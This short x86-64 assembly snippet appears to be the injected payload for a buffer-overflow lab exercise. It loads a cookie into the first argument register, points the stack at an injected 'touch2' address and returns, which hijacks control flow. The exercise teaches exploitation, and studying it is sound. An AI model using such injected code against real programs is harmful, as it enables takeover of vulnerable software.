movq $0x3c1eff45, %rdi # move cookie to first argument register
movq $0x55669a00, %rsp # move the address of the injected touch2 address to stack pointer register
retq # return
